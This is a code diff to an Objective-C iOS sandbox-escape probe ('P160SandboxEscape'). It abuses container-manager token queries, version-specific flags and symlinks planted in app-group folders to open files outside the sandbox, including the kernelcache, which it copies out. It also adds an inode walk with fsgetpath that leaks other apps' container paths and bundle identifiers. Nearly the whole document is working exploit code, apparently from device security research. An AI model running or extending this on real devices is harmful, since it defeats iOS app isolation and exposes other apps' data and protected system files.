@@ -14,7 +14,16 @@
 #import <Foundation/Foundation.h>
 #import <dlfcn.h>
 #include <dirent.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <string.h>
 #import <fcntl.h>
+#import <sys/mount.h>
+#if __has_include(<sys/fsgetpath.h>)
+#import <sys/fsgetpath.h>
+#else
+extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid);
+#endif
 #import <sys/stat.h>
 #import <unistd.h>
 
@@ -158,6 +167,28 @@ static BOOL p160_can_open(NSString *path, BOOL dir) {
     return YES;
 }
 
+/* Erosion's grantAccess verifies actual readability/writability after
+   consuming the token; an issued token is not proof the sandbox allowed the
+   operation. Keep the two checks separate: read-only targets (kernelcache,
+   SystemGroup caches) are useful even when W_OK fails. */
+static BOOL p160_target_read(NSString *target) {
+    if (access(target.fileSystemRepresentation, R_OK) != 0) return NO;
+    BOOL dir = NO;
+    [[NSFileManager defaultManager] fileExistsAtPath:target isDirectory:&dir];
+    return p160_can_open(target, dir);
+}
+
+static BOOL p160_target_writable(NSString *target) {
+    if (access(target.fileSystemRepresentation, W_OK) != 0) return NO;
+    BOOL dir = NO;
+    [[NSFileManager defaultManager] fileExistsAtPath:target isDirectory:&dir];
+    if (dir) return p160_can_open(target, YES);
+    int fd = open(target.fileSystemRepresentation, O_RDWR);
+    if (fd < 0) return NO;
+    close(fd);
+    return YES;
+}
+
 static NSString *p160_dump_kernelcache(NSString *src, NSString *docs, NSMutableString *o) {
     NSString *dst = [docs stringByAppendingPathComponent:
                      [NSString stringWithFormat:@"kernelcache_%@", [LabDeviceProfile osversion]]];
@@ -193,8 +224,70 @@ static void p160_recover_library(NSMutableString *o) {
     }
 }
 
+/* Erosion reads the app's own app-group entitlement at runtime
+   (SecTaskCreateFromSelf + SecTaskCopyValueForEntitlement) instead of
+   hardcoding a group. That is the right shape: if the build is signed with
+   a real group array, p160 uses it automatically; if the value is the
+   malformed integer from an old experiment, it says so. */
+typedef void *(*p160_sectask_create_fn)(CFAllocatorRef);
+typedef CFTypeRef (*p160_sectask_copy_fn)(void *, CFStringRef, CFErrorRef *);
+static NSArray<NSString *> *g_p160_ent_groups;
+
+static NSArray<NSString *> *p160_entitlement_groups(NSMutableString *o) {
+    NSMutableArray *out = [NSMutableArray array];
+    void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security",
+                       RTLD_LAZY);
+    void *h = sec ? sec : RTLD_DEFAULT;
+    p160_sectask_create_fn create =
+        (p160_sectask_create_fn)dlsym(h, "SecTaskCreateFromSelf");
+    p160_sectask_copy_fn copy =
+        (p160_sectask_copy_fn)dlsym(h, "SecTaskCopyValueForEntitlement");
+    if (!create || !copy) {
+        [o appendString:@"  [ent] SecTask unavailable\n"];
+        if (sec) dlclose(sec);
+        return out;
+    }
+    void *task = create(kCFAllocatorDefault);
+    if (!task) {
+        [o appendString:@"  [ent] SecTaskCreateFromSelf NULL\n"];
+        if (sec) dlclose(sec);
+        return out;
+    }
+    CFTypeRef v = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
+    if (v) {
+        CFTypeID tid = CFGetTypeID(v);
+        if (tid == CFArrayGetTypeID()) {
+            CFArrayRef arr = (CFArrayRef)v;
+            for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
+                CFTypeRef e = CFArrayGetValueAtIndex(arr, i);
+                if (e && CFGetTypeID(e) == CFStringGetTypeID()) {
+                    NSString *s = [NSString stringWithString:(__bridge NSString *)e];
+                    if (s.length && ![out containsObject:s]) [out addObject:s];
+                }
+            }
+            [o appendFormat:@"  [ent] app-group array: %lu id(s)%@\n",
+                (unsigned long)out.count,
+                out.count ? [@" — " stringByAppendingString:
+                    [out componentsJoinedByString:@","]] : @""];
+        } else if (tid == CFNumberGetTypeID()) {
+            [o appendString:@"  [ent] app-group is an INTEGER (malformed; no group)\n"];
+        } else {
+            [o appendString:@"  [ent] app-group is not an array (malformed)\n"];
+        }
+        CFRelease(v);
+    } else {
+        [o appendString:@"  [ent] no com.apple.security.application-groups\n"];
+    }
+    CFRelease(task);
+    if (sec) dlclose(sec);
+    return out;
+}
+
 static NSArray<NSString *> *p160_group_candidates(void) {
     NSMutableArray *ids = [NSMutableArray array];
+    for (NSString *g in g_p160_ent_groups ?: @[]) {
+        if (g.length && ![ids containsObject:g]) [ids addObject:g];
+    }
     NSString *docs = NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
     if (docs) {
@@ -245,6 +338,15 @@ static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **
         NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
         if (!u) continue;
         NSString *lib = [u.path stringByAppendingPathComponent:@"Library"];
+        /* Erosion's flag law: on iOS 26.x targeting an AppGroup container,
+           the 26.x flag 0x800000000 is the one that works; otherwise the
+           27.x 0x8000000000 is first. Keep the third value as a fallback. */
+        int major = (int)[NSProcessInfo processInfo].operatingSystemVersion.majorVersion;
+        BOOL alt = (major == 26) &&
+            [target containsString:@"/var/mobile/Containers/Shared/AppGroup"];
+        NSArray<NSNumber *> *flags = alt
+            ? @[@(UINT64_C(0x800000000)), @(UINT64_C(0x8000000000)), @(P160_FLAGS)]
+            : @[@(UINT64_C(0x8000000000)), @(UINT64_C(0x800000000)), @(P160_FLAGS)];
         /* part 3 = Library/Caches, part 2 = Library/Preferences (both work). */
         for (NSNumber *partNum in @[@3, @2]) {
             uint64_t part = partNum.unsignedLongLongValue;
@@ -261,15 +363,13 @@ static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **
             int64_t result = -1;
             if (symlink(target.fileSystemRepresentation,
                         partPath.fileSystemRepresentation) == 0) {
-                for (NSNumber *flagNum in @[@(UINT64_C(0x8000000000)),
-                                            @(UINT64_C(0x800000000)),
-                                            @(P160_FLAGS)]) {
+                for (NSNumber *flagNum in flags) {
                     g_p160_flags = flagNum.unsignedLongLongValue;
                     NSString *path = nil, *err = nil;
                     int64_t h = p160_query(7, gid.UTF8String, YES, part,
                                            @"", @"class7", &path, &err);
                     if (h >= 0) {
-                        if (p160_can_open(target, YES)) {
+                        if (p160_target_read(target)) {
                             result = h; if (pathOut) *pathOut = path;
                             g_p160_flags = P160_FLAGS;
                             p160_restore_part(partPath, wasDir);
@@ -324,7 +424,7 @@ static int64_t p160_class2_parent(NSString *target, NSString **pathOut, NSString
         NSString *path = nil, *err = nil;
         int64_t h = p160_query(2, bid.UTF8String, NO, 3, @"", @"class2-parent", &path, &err);
         if (h >= 0) {
-            if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; }
+            if (p160_target_read(target)) { result = h; if (pathOut) *pathOut = path; }
             else if (g.release) g.release(h);
         }
         if (errOut && err) *errOut = err;
@@ -366,7 +466,7 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
             NSString *path = nil, *err = nil;
             int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-stage", &path, &err);
             if (h >= 0) {
-                if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
+                if (p160_target_read(target)) { result = h; if (pathOut) *pathOut = path; break; }
                 if (g.release) g.release(h);
             }
             if (errOut && err) *errOut = err;
@@ -384,7 +484,7 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
                 NSString *path = nil, *err = nil;
                 int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-subpath", &path, &err);
                 if (h >= 0) {
-                    if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
+                    if (p160_target_read(target)) { result = h; if (pathOut) *pathOut = path; break; }
                     if (g.release) g.release(h);
                 }
                 if (errOut && err) *errOut = err;
@@ -396,6 +496,46 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
     return result;
 }
 
+/* Erosion's bad_query/pathleak: fsgetpath resolves an inode to an absolute
+   path with no caller-container restriction. Walking inodes enumerates the
+   direct children of a prefix, which is how the escape finds container
+   UUIDs without a computer. Read-only. */
+static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *o) {
+    struct statfs sfs;
+    if (statfs(prefix.fileSystemRepresentation, &sfs) != 0) {
+        [o appendFormat:@"  [pathleak] statfs %@ failed errno=%d\n", prefix, errno];
+        return;
+    }
+    fsid_t fsid = sfs.f_fsid;
+    NSString *want = [prefix hasSuffix:@"/"] ? prefix
+        : [prefix stringByAppendingString:@"/"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    char buf[1200];
+    uint64_t total = 0;
+    int shown = 0;
+    for (uint64_t ino = 1; ino <= maxInode; ino++) {
+        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
+        if (n <= 0) continue;
+        NSString *p = [fm stringWithFileSystemRepresentation:buf length:strlen(buf)];
+        if (!p || ![p hasPrefix:want]) continue;
+        NSString *rest = [p substringFromIndex:want.length];
+        if (!rest.length || [rest containsString:@"/"]) continue;
+        total++;
+        if (shown < 48) {
+            NSString *meta = [p stringByAppendingPathComponent:
+                @".com.apple.mobile_container_manager.metadata.plist"];
+            NSDictionary *md = [NSDictionary dictionaryWithContentsOfFile:meta];
+            NSString *bid = [md[@"MCMMetadataIdentifier"] isKindOfClass:[NSString class]]
+                ? md[@"MCMMetadataIdentifier"] : nil;
+            [o appendFormat:@"  [leak] %@%@\n", rest,
+                bid ? [@" bundle=" stringByAppendingString:bid] : @""];
+            shown++;
+        }
+    }
+    [o appendFormat:@"  [pathleak] %@ entries=%llu shown=%d maxInode=%llu\n",
+        prefix, (unsigned long long)total, shown, (unsigned long long)maxInode];
+}
+
 @implementation P160SandboxEscape
 
 + (NSString *)tap {
@@ -405,6 +545,7 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
     [o appendString:[LabDeviceProfile identBlock]];
     p160_recover_library(o);
     [o appendFormat:@"  [mcm] %@\n", p160_load() ? @"loaded" : @"MISSING (libsystem_containermanager not available)"];
+    g_p160_ent_groups = p160_entitlement_groups(o);
 
     NSString *docs = NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
@@ -432,7 +573,7 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
         NSString *objPath = nil, *err = nil;
         int64_t h = p160_query(13, P160_MG_GROUP, YES, 3, domain,
                                t[@"name"], &objPath, &err);
-        BOOL can = (h >= 0) ? p160_can_open(path, [t[@"dir"] boolValue]) : NO;
+        BOOL can = (h >= 0) ? p160_target_read(path) : NO;
         if (h < 0 && [t[@"dir"] boolValue]) {
             NSString *c2path = nil, *c2err = nil;
             int64_t h2 = p160_class2_try(path, &c2path, &c2err);
@@ -449,15 +590,17 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
                 else if (perr.length) c2err = perr;
             }
             if (h2 >= 0) {
-                h = h2; objPath = c2path; can = p160_can_open(path, YES);
-                [o appendFormat:@"      [class2] handle=%lld obj=%@ open=%d\n",
-                    (long long)h2, c2path ?: @"(null)", can];
+                h = h2; objPath = c2path; can = p160_target_read(path);
+                [o appendFormat:@"      [class2] handle=%lld obj=%@ open=%d w=%d\n",
+                    (long long)h2, c2path ?: @"(null)", can,
+                    p160_target_writable(path)];
             } else if (c2err.length) {
                 [o appendFormat:@"      [class2] miss %@\n", c2err];
             }
         }
-        [o appendFormat:@"  [%@] handle=%lld obj=%@ open=%d %@\n",
+        [o appendFormat:@"  [%@] handle=%lld obj=%@ open=%d w=%d %@\n",
             t[@"name"], (long long)h, objPath ?: @"(null)", can,
+            p160_target_writable(path),
             err ? [@"err=" stringByAppendingString:err] : @""];
         if (h >= 0) {
             if (can && [t[@"name"] isEqualToString:@"kernelcache"] && dumpKC && docs) {
@@ -465,6 +608,20 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
             }
             if (g.release) g.release(h);
         }
+    }
+
+    BOOL doLeak = docs && [[NSFileManager defaultManager]
+        fileExistsAtPath:[docs stringByAppendingPathComponent:@"lum1na_pathleak"]];
+    if (doLeak) {
+        uint64_t maxInode = 400000;
+        NSString *knob = [NSString stringWithContentsOfFile:
+            [docs stringByAppendingPathComponent:@"p160_pathleak_max"]
+            encoding:NSUTF8StringEncoding error:NULL];
+        if (knob.length) {
+            long long v = strtoll(knob.UTF8String, NULL, 10);
+            if (v > 0) maxInode = (uint64_t)(v > 2000000 ? 2000000 : v);
+        }
+        p160_pathleak(@"/var/mobile/Containers/Data/Application", maxInode, o);
     }
 
     [o appendString:@"  [verdict] read-only token probe. class-13 traversal works if open=1; "
